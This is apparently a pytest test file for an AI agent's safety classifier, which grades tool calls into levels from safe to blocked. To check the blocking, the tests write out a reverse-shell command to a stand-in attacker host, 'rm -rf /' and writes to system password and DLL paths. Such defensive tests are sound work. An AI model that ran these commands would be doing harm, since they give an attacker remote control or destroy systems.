#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Copyright © 2025-2026 Wenze Wei. All Rights Reserved.
#
# This file is part of Encre.
# The Encre project belongs to the Dunimd Team.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# You may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# DISCLAIMER: Users must comply with applicable AI regulations.
# Non-compliance may result in service termination or legal liability.

from __future__ import annotations

"""Tests for encre.autosafety -- ML-based safety classifier for auto permission mode."""

import pytest
from encre.autosafety import (
    AutoDecision,
    ClassificationResult,
    EncreAutoSafetyClassifier,
    UserDecisionRecord,
)

# ── AutoDecision Enum ────────────────────────────────────────────────────

class TestAutoDecision:
    """Test suite for AutoDecision."""
    def test_all_levels_exist(self):
        """Test: All levels exist."""
        # Verify: AutoDecision.SAFE is not None
        assert AutoDecision.SAFE is not None
        # Verify: AutoDecision.LOW_RISK is not None
        assert AutoDecision.LOW_RISK is not None
        # Verify: AutoDecision.ASK_USER is not None
        assert AutoDecision.ASK_USER is not None
        # Verify: AutoDecision.HIGH_RISK is not None
        assert AutoDecision.HIGH_RISK is not None
        # Verify: AutoDecision.BLOCK is not None
        assert AutoDecision.BLOCK is not None

    def test_distinct_values(self):
        """Test: Distinct values."""
        values = {AutoDecision.SAFE, AutoDecision.LOW_RISK, AutoDecision.ASK_USER,
                   AutoDecision.HIGH_RISK, AutoDecision.BLOCK}
        # Verify: len(values) == 5
        assert len(values) == 5

    def test_string_representation(self):
        # Enum auto() values; they should have names
        """Test: String representation."""
        assert AutoDecision.SAFE.name == "SAFE"
        # Verify: AutoDecision.BLOCK.name == "BLOCK"
        assert AutoDecision.BLOCK.name == "BLOCK"


# ── ClassificationResult ─────────────────────────────────────────────────

class TestClassificationResult:
    """Test suite for ClassificationResult."""
    def test_defaults(self):
        """Test: Defaults."""
        result = ClassificationResult(
            decision=AutoDecision.SAFE,
            confidence=0.95,
        )
        # Verify: result.decision == AutoDecision.SAFE
        assert result.decision == AutoDecision.SAFE
        # Verify: result.confidence == 0.95
        assert result.confidence == 0.95
        # Verify: result.reasoning == ""
        assert result.reasoning == ""
        # Verify: result.tool_name == ""
        assert result.tool_name == ""
        # Verify: result.tool_args == {}
        assert result.tool_args == {}
        # Verify: result.latency_ms == 0.0
        assert result.latency_ms == 0.0

    def test_full_construction(self):
        """Test: Full construction."""
        result = ClassificationResult(
            decision=AutoDecision.BLOCK,
            confidence=1.0,
            reasoning="Critical danger: reverse shell",
            tool_name="bash",
            tool_args={"command": "bash -i >& /dev/tcp/evil.com/443 0>&1"},
            latency_ms=12.5,
        )
        # Verify: result.decision == AutoDecision.BLOCK
        assert result.decision == AutoDecision.BLOCK
        # Verify: result.confidence == 1.0
        assert result.confidence == 1.0
        # Verify: result.reasoning == "Critical danger: reverse shell"
        assert result.reasoning == "Critical danger: reverse shell"
        # Verify: result.tool_name == "bash"
        assert result.tool_name == "bash"
        # Verify: result.latency_ms == 12.5
        assert result.latency_ms == 12.5

    def test_confidence_bounds(self):
        # confidence should be 0.0 to 1.0 in practice
        """Test: Confidence bounds."""
        for val in [0.0, 0.5, 1.0]:
            result = ClassificationResult(
                decision=AutoDecision.ASK_USER,
                confidence=val,
            )
            # Verify: 0.0 <= result.confidence <= 1.0
            assert 0.0 <= result.confidence <= 1.0


# ── UserDecisionRecord ───────────────────────────────────────────────────

class TestUserDecisionRecord:
    """Test suite for UserDecisionRecord."""
    def test_defaults(self):
        """Test: Defaults."""
        rec = UserDecisionRecord(
            tool_name="bash",
            tool_args_summary="command=ls",
            user_approved=True,
        )
        # Verify: rec.tool_name == "bash"
        assert rec.tool_name == "bash"
        # Verify: rec.tool_args_summary == "command=ls"
        assert rec.tool_args_summary == "command=ls"
        # Verify: rec.user_approved is True
        assert rec.user_approved is True
        # Verify: rec.timestamp > 0
        assert rec.timestamp > 0

    def test_denied_record(self):
        """Test: Denied record."""
        rec = UserDecisionRecord(
            tool_name="file_write",
            tool_args_summary="path=/etc/hosts",
            user_approved=False,
        )
        # Verify: rec.user_approved is False
        assert rec.user_approved is False


# ── EncreAutoSafetyClassifier ──────────────────────────────────────────────

class TestEncreAutoSafetyClassifier:
    """Test suite for EncreAutoSafetyClassifier."""
    def setup_method(self):
        """Setup method."""
        self.classifier = EncreAutoSafetyClassifier()

    def test_initial_state(self):
        """Test: Initial state."""
        # Verify: self.classifier._total_classifications == 0
        assert self.classifier._total_classifications == 0
        # Verify: self.classifier._cache_hits == 0
        assert self.classifier._cache_hits == 0
        # Verify: len(self.classifier._cache) == 0
        assert len(self.classifier._cache) == 0
        # Verify: len(self.classifier._user_decisions) == 0
        assert len(self.classifier._user_decisions) == 0

    def test_default_parameters(self):
        """Test: Default parameters."""
        # Verify: self.classifier._confidence_threshold == 0.7
        assert self.classifier._confidence_threshold == 0.7
        # Verify: self.classifier._cache_size == 1000
        assert self.classifier._cache_size == 1000

    def test_custom_parameters(self):
        """Test: Custom parameters."""
        c = EncreAutoSafetyClassifier(
            backend_type="anthropic",
            model="claude-haiku-4-5-20251001",
            confidence_threshold=0.85,
            cache_size=500,
        )
        # Verify: c._backend_type == "anthropic"
        assert c._backend_type == "anthropic"
        # Verify: c._model == "claude-haiku-4-5-20251001"
        assert c._model == "claude-haiku-4-5-20251001"
        # Verify: c._confidence_threshold == 0.85
        assert c._confidence_threshold == 0.85
        # Verify: c._cache_size == 500
        assert c._cache_size == 500

    def test_stats_property(self):
        """Test: Stats property."""
        stats = self.classifier.stats
        # Verify: isinstance(stats, dict)
        assert isinstance(stats, dict)
        # Verify: "total_classifications" in stats
        assert "total_classifications" in stats
        # Verify: "cache_hits" in stats
        assert "cache_hits" in stats
        # Verify: "cache_size" in stats
        assert "cache_size" in stats
        # Verify: "cache_hit_rate" in stats
        assert "cache_hit_rate" in stats
        # Verify: "user_decisions_recorded" in stats
        assert "user_decisions_recorded" in stats

    def test_stats_cache_hit_rate_no_divisions(self):
        """cache_hit_rate should not divide by zero even with 0 classifications."""
        stats = self.classifier.stats
        # Verify: stats["cache_hit_rate"] >= 0.0
        assert stats["cache_hit_rate"] >= 0.0

    def test_learn_from_user(self):
        """Test: Learn from user."""
        self.classifier.learn_from_user(
            "bash", {"command": "ls -la"}, True
        )
        # Verify: len(self.classifier._user_decisions) == 1
        assert len(self.classifier._user_decisions) == 1
        rec = self.classifier._user_decisions[0]
        # Verify: rec.tool_name == "bash"
        assert rec.tool_name == "bash"
        # Verify: rec.user_approved is True
        assert rec.user_approved is True

    def test_learn_from_user_multiple(self):
        """Test: Learn from user multiple."""
        for i in range(5):
            self.classifier.learn_from_user("bash", {"command": f"cmd{i}"}, i % 2 == 0)
        # Verify: len(self.classifier._user_decisions) == 5
        assert len(self.classifier._user_decisions) == 5

    def test_learn_from_user_respects_cache_size(self):
        """Test: Learn from user respects cache size."""
        c = EncreAutoSafetyClassifier(cache_size=10)
        for i in range(20):
            c.learn_from_user("bash", {"cmd": f"cmd{i}"}, True)
        # Verify: len(c._user_decisions) <= 10
        assert len(c._user_decisions) <= 10

    def test_get_user_pattern_empty(self):
        """Test: Get user pattern empty."""
        pattern = self.classifier.get_user_pattern("bash")
        # Verify: pattern is None
        assert pattern is None

    def test_get_user_pattern_with_data(self):
        """Test: Get user pattern with data."""
        self.classifier.learn_from_user("bash", {"command": "ls"}, True)
        self.classifier.learn_from_user("bash", {"command": "cat"}, True)
        self.classifier.learn_from_user("bash", {"command": "rm"}, False)
        pattern = self.classifier.get_user_pattern("bash")
        # Verify: pattern is not None
        assert pattern is not None
        # Verify: pattern["total"] == 3
        assert pattern["total"] == 3
        # Verify: pattern["approved"] == 2
        assert pattern["approved"] == 2
        # Verify: pattern["denied"] == 1
        assert pattern["denied"] == 1
        # Verify: pattern["approval_rate"] == pytest.approx(2.0 / 3.0)
        assert pattern["approval_rate"] == pytest.approx(2.0 / 3.0)


# ── Pattern Classification (sync) ────────────────────────────────────────

class TestPatternClassification:
    """Test the fast pattern-based pre-classification (no LLM needed)."""

    def setup_method(self):
        """Setup method."""
        self.classifier = EncreAutoSafetyClassifier()

    def test_empty_bash_command_safe(self):
        """Test: Empty bash command safe."""
        result = self.classifier._pattern_classify("bash", {"command": ""})
        # Verify: result.decision == AutoDecision.SAFE
        assert result.decision == AutoDecision.SAFE
        # Verify: result.confidence == 1.0
        assert result.confidence == 1.0

    def test_safe_bash_command(self):
        """Test: Safe bash command."""
        result = self.classifier._pattern_classify("bash", {"command": "ls -la"})
        # Verify: result.decision == AutoDecision.SAFE
        assert result.decision == AutoDecision.SAFE

    def test_critical_bash_blocked(self):
        """Test: Critical bash blocked."""
        result = self.classifier._pattern_classify("bash", {"command": "rm -rf /"})
        # Verify: result.decision in (AutoDecision.BLOCK, AutoDecision.HIGH_RISK)
        assert result.decision in (AutoDecision.BLOCK, AutoDecision.HIGH_RISK)

    def test_dangerous_path_blocked(self):
        """Test: Dangerous path blocked."""
        result = self.classifier._pattern_classify(
            "file_write", {"path": "/etc/passwd"}
        )
        # Verify: result.decision == AutoDecision.BLOCK
        assert result.decision == AutoDecision.BLOCK

    def test_windows_system_path_blocked(self):
        """Test: Windows system path blocked."""
        result = self.classifier._pattern_classify(
            "file_write", {"path": "C:\\Windows\\System32\\evil.dll"}
        )
        # Verify: result.decision == AutoDecision.BLOCK
        assert result.decision == AutoDecision.BLOCK

    def test_sensitive_file_asks_user(self):
        """Test: Sensitive file asks user."""
        result = self.classifier._pattern_classify(
            "file_write", {"path": "project/.env"}
        )
        # Verify: result.decision == AutoDecision.ASK_USER
        assert result.decision == AutoDecision.ASK_USER

    def test_credential_file_asks_user(self):
        """Test: Credential file asks user."""
        result = self.classifier._pattern_classify(
            "file_edit", {"file_path": "src/api_key.json"}
        )
        # Verify: result.decision == AutoDecision.ASK_USER
        assert result.decision == AutoDecision.ASK_USER

    def test_normal_file_write_low_risk(self):
        """Test: Normal file write low risk."""
        result = self.classifier._pattern_classify(
            "file_write", {"path": "project/main.py"}
        )
        # Verify: result.decision == AutoDecision.LOW_RISK
        assert result.decision == AutoDecision.LOW_RISK

    def test_unknown_tool_asks_user(self):
        """Test: Unknown tool asks user."""
        result = self.classifier._pattern_classify(
            "some_new_tool", {"arg": "val"}
        )
        # Verify: result.decision == AutoDecision.ASK_USER
        assert result.decision == AutoDecision.ASK_USER


# ── Cache Key Generation ─────────────────────────────────────────────────

class TestCacheKey:
    """Test suite for CacheKey."""
    def setup_method(self):
        """Setup method."""
        self.classifier = EncreAutoSafetyClassifier()

    def test_basic_key(self):
        """Test: Basic key."""
        key = self.classifier._make_cache_key("bash", {"command": "ls"})
        # Verify: key.startswith("bash")
        assert key.startswith("bash")
        # Verify: "command=ls" in key
        assert "command=ls" in key

    def test_key_different_args_different_keys(self):
        """Test: Key different args different keys."""
        k1 = self.classifier._make_cache_key("bash", {"command": "ls"})
        k2 = self.classifier._make_cache_key("bash", {"command": "rm"})
        # Verify: k1 != k2
        assert k1 != k2

    def test_key_same_args_same_key(self):
        """Test: Key same args same key."""
        k1 = self.classifier._make_cache_key("bash", {"command": "ls", "path": "/tmp"})
        k2 = self.classifier._make_cache_key("bash", {"command": "ls", "path": "/tmp"})
        # Verify: k1 == k2
        assert k1 == k2

    def test_key_extracts_command_base(self):
        """Long commands should be extracted to their base command."""
        key = self.classifier._make_cache_key("bash", {"command": "ls -la /tmp"})
        # Verify: "command=ls" in key
        assert "command=ls" in key

    def test_key_numeric_args(self):
        """Test: Key numeric args."""
        key = self.classifier._make_cache_key("bash", {"timeout": 30})
        # Verify: "timeout=int" in key or "timeout" in key
        assert "timeout=int" in key or "timeout" in key

    def test_cache_result(self):
        """Test: Cache result."""
        self.classifier._cache_result("test_key", ClassificationResult(
            decision=AutoDecision.SAFE, confidence=0.99
        ))
        # Verify: "test_key" in self.classifier._cache
        assert "test_key" in self.classifier._cache


# ── Parse Response ───────────────────────────────────────────────────────

class TestParseResponse:
    """Test suite for ParseResponse."""
    def setup_method(self):
        """Setup method."""
        self.classifier = EncreAutoSafetyClassifier()

    def test_parse_safe_response(self):
        """Test: Parse safe response."""
        response = '{"safe": true, "risk_level": "safe", "confidence": 0.99, "reasoning": "read only"}'  # noqa: E501
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.SAFE
        assert result.decision == AutoDecision.SAFE
        # Verify: result.confidence == 0.99
        assert result.confidence == 0.99

    def test_parse_critical_response(self):
        """Test: Parse critical response."""
        response = '{"safe": false, "risk_level": "critical", "confidence": 1.0, "reasoning": "rm -rf"}'  # noqa: E501
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.BLOCK
        assert result.decision == AutoDecision.BLOCK

    def test_parse_high_risk_response(self):
        """Test: Parse high risk response."""
        response = '{"safe": false, "risk_level": "high", "confidence": 0.9, "reasoning": "sudo"}'
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.HIGH_RISK
        assert result.decision == AutoDecision.HIGH_RISK

    def test_parse_medium_risk_response(self):
        """Test: Parse medium risk response."""
        response = '{"safe": false, "risk_level": "medium", "confidence": 0.6, "reasoning": "ambiguous"}'  # noqa: E501
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.ASK_USER
        assert result.decision == AutoDecision.ASK_USER

    def test_parse_low_risk_response(self):
        """Test: Parse low risk response."""
        response = '{"safe": true, "risk_level": "low", "confidence": 0.8, "reasoning": "local write"}'  # noqa: E501
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.LOW_RISK
        assert result.decision == AutoDecision.LOW_RISK

    def test_parse_malformed_json_fallback(self):
        """Test: Parse malformed json fallback."""
        result = self.classifier._parse_response("not json at all")
        # Verify: result.decision == AutoDecision.ASK_USER
        assert result.decision == AutoDecision.ASK_USER
        # Verify: result.confidence == 0.0
        assert result.confidence == 0.0

    def test_parse_json_with_markdown_wrapper(self):
        """_parse_response handles JSON wrapped in markdown code fences."""
        response = '```json\n{"safe": true, "risk_level": "safe", "confidence": 0.99, "reasoning": "ok"}\n```'  # noqa: E501
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.SAFE
        assert result.decision == AutoDecision.SAFE
        # Verify: result.confidence == 0.99
        assert result.confidence == 0.99

    def test_parse_with_text_before_json(self):
        """Test: Parse with text before json."""
        response = 'Here is my evaluation:\n{"safe": false, "risk_level": "high", "confidence": 0.85, "reasoning": "danger"}'  # noqa: E501
        result = self.classifier._parse_response(response)
        # Verify: result.decision == AutoDecision.HIGH_RISK
        assert result.decision == AutoDecision.HIGH_RISK
